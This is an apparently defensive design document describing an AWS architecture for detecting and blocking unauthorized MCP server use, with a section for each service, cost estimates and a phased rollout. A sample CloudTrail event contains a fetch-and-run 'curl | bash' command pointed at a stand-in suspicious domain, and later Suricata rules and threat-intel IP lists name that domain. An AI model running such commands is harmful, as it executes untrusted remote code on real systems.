# AWS Components for Unauthorized MCP Detection

## Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                           AWS MCP Detection Architecture                         │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  ┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐             │
│  │   Data Sources  │    │   Processing    │    │   Detection     │             │
│  │                 │    │                 │    │                 │             │
│  │ • VPC Flow Logs │───▶│ • Lambda        │───▶│ • GuardDuty     │             │
│  │ • CloudTrail    │    │ • Kinesis       │    │ • Security Hub  │             │
│  │ • Systems Mgr   │    │ • Athena        │    │ • Config Rules  │             │
│  │ • DNS Logs      │    │ • OpenSearch    │    │ • Custom Rules  │             │
│  └─────────────────┘    └─────────────────┘    └─────────────────┘             │
│           │                       │                       │                     │
│           │                       │                       ▼                     │
│           │                       │              ┌─────────────────┐             │
│           │                       │              │   Response      │             │
│           │                       │              │                 │             │
│           │                       └─────────────▶│ • EventBridge   │             │
│           │                                      │ • SNS/SQS       │             │
│           │                                      │ • Auto Remediate │             │
│           │                                      │ • Network FW     │             │
│           │                                      └─────────────────┘             │
│           │                                                                      │
│           ▼                                                                      │
│  ┌─────────────────┐                                                            │
│  │   Storage       │                                                            │
│  │                 │                                                            │
│  │ • S3 (Logs)     │                                                            │
│  │ • OpenSearch    │                                                            │
│  │ • CloudWatch    │                                                            │
│  └─────────────────┘                                                            │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

## Core AWS Components

### 1. **VPC Flow Logs** - Network Traffic Analysis
**Purpose**: Capture all network traffic metadata for MCP connection detection

**Key Capabilities**:
- Captures source/destination IPs, ports, protocols
- Records packet counts and byte transfers
- Tracks connection accept/reject decisions
- Provides timing information for traffic analysis

**MCP Detection Use Cases**:
```sql
-- Detect connections to common MCP ports
SELECT srcaddr, dstaddr, dstport, COUNT(*) as connections
FROM vpc_flow_logs 
WHERE dstport IN (8080, 3000, 5000, 8000, 9000)
  AND action = 'ACCEPT'
GROUP BY srcaddr, dstaddr, dstport
HAVING connections > 10;

-- Identify large data transfers (potential data exfiltration)
SELECT srcaddr, dstaddr, SUM(bytes) as total_bytes
FROM vpc_flow_logs
WHERE bytes > 1000000
GROUP BY srcaddr, dstaddr
ORDER BY total_bytes DESC;
```

**Cost**: ~$0.50 per million flow log records

### 2. **Amazon GuardDuty** - Intelligent Threat Detection
**Purpose**: ML-powered threat detection with custom MCP threat intelligence

**Key Capabilities**:
- Analyzes VPC Flow Logs, DNS logs, CloudTrail events
- Uses machine learning for anomaly detection
- Supports custom threat intelligence feeds
- Provides threat severity scoring

**MCP-Specific Enhancements**:
```python
# Custom threat intelligence for known malicious MCP servers
threat_intel_ips = [
    "185.220.101.42",  # Known malicious MCP server
    "103.224.182.245", # Suspicious hosting provider
    "45.142.214.123"   # Tor exit node hosting MCP
]

# Custom finding types
finding_types = [
    "UnauthorizedMCP/Communication",
    "UnauthorizedMCP/DataExfiltration", 
    "UnauthorizedMCP/SuspiciousDomain"
]
```

**Cost**: ~$4.00 per million analyzed events

### 3. **AWS CloudTrail** - API Activity Monitoring
**Purpose**: Track all AWS API calls related to MCP infrastructure

**Key Capabilities**:
- Logs all AWS API calls with detailed metadata
- Tracks resource access and modifications
- Provides user attribution and source IP
- Supports advanced event filtering

**MCP Monitoring Scenarios**:
```json
{
  "eventName": "RunInstances",
  "requestParameters": {
    "userData": "#!/bin/bash\ncurl -sSL https://suspicious-mcp-server.tk/install.sh | bash"
  },
  "sourceIPAddress": "203.0.113.12",
  "userIdentity": {
    "type": "IAMUser",
    "principalId": "AIDACKCEVSQ6C2EXAMPLE",
    "userName": "john.doe"
  }
}
```

**Cost**: ~$2.00 per 100,000 events

### 4. **AWS Config** - Configuration Compliance
**Purpose**: Ensure AWS resources comply with MCP security policies

**Key Capabilities**:
- Monitors resource configuration changes
- Evaluates compliance against custom rules
- Provides configuration history and relationships
- Supports automated remediation

**MCP Compliance Rules**:
```python
config_rules = [
    {
        "rule_name": "mcp-security-group-compliance",
        "description": "Security groups must not allow unrestricted access to MCP ports",
        "trigger": "configuration_change",
        "resource_types": ["AWS::EC2::SecurityGroup"]
    },
    {
        "rule_name": "mcp-instance-tagging",
        "description": "EC2 instances with MCP software must be tagged",
        "required_tags": ["MCPUsage", "DataClassification", "Owner"]
    }
]
```

**Cost**: ~$0.003 per configuration item per month

### 5. **AWS Systems Manager** - Endpoint Monitoring
**Purpose**: Monitor and manage MCP processes on EC2 instances

**Key Capabilities**:
- Executes commands on managed instances
- Collects system information and logs
- Manages software inventory and patches
- Provides session management and logging

**MCP Process Detection**:
```bash
# SSM Run Command to detect MCP processes
aws ssm send-command \
  --document-name "MCP-Process-Monitor" \
  --targets "Key=tag:Environment,Values=Production" \
  --parameters "action=monitor"

# Output includes:
# - Running MCP processes
# - Network connections to MCP ports
# - DNS queries to MCP domains
# - System resource usage
```

**Cost**: ~$0.00243 per managed instance per hour

### 6. **AWS Lambda** - Real-time Processing
**Purpose**: Process events in real-time for immediate MCP threat detection

**Key Capabilities**:
- Serverless event processing
- Integrates with all AWS services
- Supports custom business logic
- Scales automatically with load

**MCP Event Processing**:
```python
def lambda_handler(event, context):
    """Process VPC Flow Logs for MCP detection"""
    
    mcp_ports = [8080, 3000, 5000, 8000, 9000]
    suspicious_findings = []
    
    for record in event['Records']:
        # Parse flow log record
        flow_data = parse_flow_log(record)
        
        # Check for MCP traffic patterns
        if (flow_data['dstport'] in mcp_ports and 
            flow_data['bytes'] > 1000000):
            
            # Create Security Hub finding
            finding = create_mcp_finding(flow_data)
            suspicious_findings.append(finding)
    
    # Send to Security Hub
    if suspicious_findings:
        security_hub.batch_import_findings(Findings=suspicious_findings)
    
    return {'processed': len(event['Records'])}
```

**Cost**: ~$0.20 per million requests + compute time

### 7. **Amazon Security Hub** - Centralized Security Management
**Purpose**: Aggregate and prioritize security findings from all sources

**Key Capabilities**:
- Centralizes findings from multiple security services
- Provides unified dashboard and reporting
- Supports custom finding formats
- Integrates with SIEM and ticketing systems

**MCP Finding Format**:
```json
{
  "SchemaVersion": "2018-10-08",
  "Id": "unauthorized-mcp-connection-001",
  "ProductArn": "arn:aws:securityhub:us-east-1:123456789012:product/custom/mcp-detector",
  "GeneratorId": "mcp-network-analyzer",
  "AwsAccountId": "123456789012",
  "Types": ["Unusual Behaviors/Network/Connection"],
  "Title": "Unauthorized MCP Server Connection Detected",
  "Description": "Employee connected to unauthorized MCP server",
  "Severity": {
    "Normalized": 80,
    "Label": "HIGH"
  },
  "Resources": [{
    "Type": "AwsEc2Instance",
    "Id": "arn:aws:ec2:us-east-1:123456789012:instance/i-1234567890abcdef0"
  }]
}
```

**Cost**: ~$0.0030 per finding ingested

### 8. **AWS Network Firewall** - Advanced Traffic Inspection
**Purpose**: Deep packet inspection and blocking of unauthorized MCP traffic

**Key Capabilities**:
- Layer 3-7 traffic inspection
- Suricata-based rule engine
- Domain-based filtering
- Real-time traffic blocking

**MCP-Specific Rules**:
```suricata
# Detect MCP JSON-RPC traffic
alert tcp any any -> any any (
  msg:"Unauthorized MCP JSON-RPC Traffic"; 
  content:"jsonrpc"; content:"2.0"; 
  content:"method"; content:"tools/call"; 
  sid:1000001; rev:1;
)

# Block connections to suspicious MCP domains
drop dns any any -> any any (
  msg:"Blocked Suspicious MCP Domain"; 
  dns.query; content:"suspicious-mcp-server.tk"; 
  nocase; sid:1000002; rev:1;
)
```

**Cost**: ~$0.395 per firewall endpoint per hour + data processing

### 9. **Amazon OpenSearch** - Log Analysis and Search
**Purpose**: Store, search, and analyze large volumes of MCP-related logs

**Key Capabilities**:
- Full-text search across all log types
- Real-time dashboards and visualizations
- Machine learning for anomaly detection
- API access for custom integrations

**MCP Search Queries**:
```json
{
  "query": {
    "bool": {
      "must": [
        {"range": {"@timestamp": {"gte": "now-24h"}}},
        {"terms": {"destination_port": [8080, 3000, 5000, 8000, 9000]}},
        {"bool": {
          "must_not": [
            {"terms": {"destination_domain": ["api.anthropic.com", "localhost"]}}
          ]
        }}
      ]
    }
  },
  "aggs": {
    "top_destinations": {
      "terms": {"field": "destination_domain", "size": 10}
    }
  }
}
```

**Cost**: ~$0.155 per hour per instance + storage costs

### 10. **Amazon EventBridge** - Event Routing and Automation
**Purpose**: Route security events to appropriate response systems

**Key Capabilities**:
- Event pattern matching and filtering
- Integration with 100+ AWS services
- Custom event schemas
- Reliable event delivery

**MCP Event Routing**:
```json
{
  "Rules": [{
    "Name": "MCPHighSeverityAlert",
    "EventPattern": {
      "source": ["aws.securityhub"],
      "detail-type": ["Security Hub Findings - Imported"],
      "detail": {
        "findings": {
          "ProductFields": {
            "aws/securityhub/ProductName": ["MCP Detector"]
          },
          "Severity": {
            "Normalized": [{"numeric": [">=", 70]}]
          }
        }
      }
    },
    "Targets": [
      {
        "Id": "1",
        "Arn": "arn:aws:sns:us-east-1:123456789012:mcp-critical-alerts"
      },
      {
        "Id": "2", 
        "Arn": "arn:aws:lambda:us-east-1:123456789012:function:mcp-auto-block"
      }
    ]
  }]
}
```

**Cost**: ~$1.00 per million events

## Implementation Strategy

### Phase 1: Foundation (Week 1-2)
1. **Enable VPC Flow Logs** for all VPCs
2. **Configure CloudTrail** with MCP-specific event filtering
3. **Set up S3 buckets** for log storage with lifecycle policies
4. **Deploy basic Lambda functions** for log processing

### Phase 2: Detection (Week 3-4)
1. **Configure GuardDuty** with custom threat intelligence
2. **Create Config rules** for MCP compliance
3. **Deploy Security Hub** for centralized findings
4. **Set up OpenSearch** for log analysis

### Phase 3: Response (Week 5-6)
1. **Configure EventBridge** for event routing
2. **Set up SNS/SQS** for alerting
3. **Deploy Network Firewall** for traffic blocking
4. **Create automated response Lambda functions**

### Phase 4: Optimization (Week 7-8)
1. **Fine-tune detection rules** based on false positives
2. **Optimize costs** with reserved capacity and lifecycle policies
3. **Create custom dashboards** in OpenSearch
4. **Implement advanced ML models** for anomaly detection

## Cost Estimation

| Component | Monthly Cost (Estimate) | Description |
|-----------|------------------------|-------------|
| VPC Flow Logs | $150-500 | Based on traffic volume |
| GuardDuty | $200-800 | Based on analyzed events |
| CloudTrail | $50-200 | Based on API call volume |
| Config | $30-100 | Based on resources monitored |
| Systems Manager | $100-300 | Based on managed instances |
| Lambda | $50-200 | Based on execution frequency |
| Security Hub | $20-100 | Based on findings volume |
| Network Firewall | $300-1000 | Based on endpoints and traffic |
| OpenSearch | $200-800 | Based on instance size and storage |
| EventBridge | $10-50 | Based on event volume |
| **Total** | **$1,110-4,050** | **Varies by organization size** |

## Security Benefits

1. **Comprehensive Coverage**: Monitors network, endpoint, and API layers
2. **Real-time Detection**: Immediate alerts for high-risk activities
3. **Automated Response**: Blocks threats without human intervention
4. **Compliance Reporting**: Detailed audit trails for regulatory requirements
5. **Scalability**: Handles enterprise-scale traffic and events
6. **Integration**: Works with existing SIEM and security tools

## Best Practices

1. **Start Small**: Begin with high-value assets and expand gradually
2. **Tune Regularly**: Adjust detection rules based on false positives
3. **Monitor Costs**: Use AWS Cost Explorer to track spending
4. **Automate Everything**: Reduce manual intervention where possible
5. **Document Thoroughly**: Maintain runbooks for incident response
6. **Test Regularly**: Validate detection and response capabilities

This AWS-based architecture provides enterprise-grade detection and response capabilities for unauthorized MCP usage while leveraging native AWS security services for optimal integration and cost-effectiveness.